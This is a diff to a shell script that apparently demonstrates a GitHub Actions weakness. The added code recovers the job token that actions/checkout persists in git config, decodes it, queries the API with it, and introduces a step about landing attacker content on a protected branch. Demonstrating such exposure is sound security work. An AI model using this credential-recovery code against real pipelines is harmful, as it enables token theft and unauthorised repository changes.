@@ -6,6 +6,17 @@ set -uo pipefail
 
 API="https://api.github.com"; GQL="https://api.github.com/graphql"
 OWNER="${GITHUB_REPOSITORY%%/*}"; NAME="${GITHUB_REPOSITORY##*/}"
+
+# The job never hands this script a token. It does not need to: actions/checkout defaults to
+# persist-credentials: true, which writes the job credential into the repository's git config as
+# a basic-auth header. Any code that gets checked out can read it back.
+recover_token() {
+  local hdr b64
+  hdr=$(git config --local --get 'http.https://github.com/.extraheader' 2>/dev/null) || return 1
+  b64=${hdr##*basic }
+  printf '%s' "$b64" | base64 -d 2>/dev/null | sed 's/^x-access-token://'
+}
+GITHUB_TOKEN=$(recover_token || true)
 gh_api() { curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" -H 'Accept: application/vnd.github+json' "$@"; }
 gql() { curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" -H 'Content-Type: application/json' -d "$1" "$GQL"; }
 digest() { if command -v sha256sum >/dev/null; then printf '%s' "$1" | sha256sum | cut -c1-16; else printf '%s' "$1" | shasum -a 256 | cut -c1-16; fi; }
@@ -34,9 +45,14 @@ else
 fi
 
 echo
-echo "### 3. what the job token can do"
-gh_api -i "$API/repos/$GITHUB_REPOSITORY" -o /dev/null 2>/dev/null | tr -d '\r' | grep -i '^x-oauth-scopes\|^x-accepted' || true
-echo "permissions as reported by the run are in the job log header"
+echo "### 3. the job credential, recovered from the checkout"
+if [ -z "${GITHUB_TOKEN:-}" ]; then
+  echo "no persisted credential found"
+else
+  echo "recovered from .git/config  length=${#GITHUB_TOKEN} sha256-16=$(digest "$GITHUB_TOKEN")"
+  echo "identity it acts as: $(gh_api "$API/repos/$GITHUB_REPOSITORY" | jq -r '.full_name // "unknown"')"
+  echo "its permissions are in this run's own log header, above"
+fi
 
 echo
 echo "### 4. landing attacker content on the protected default branch"
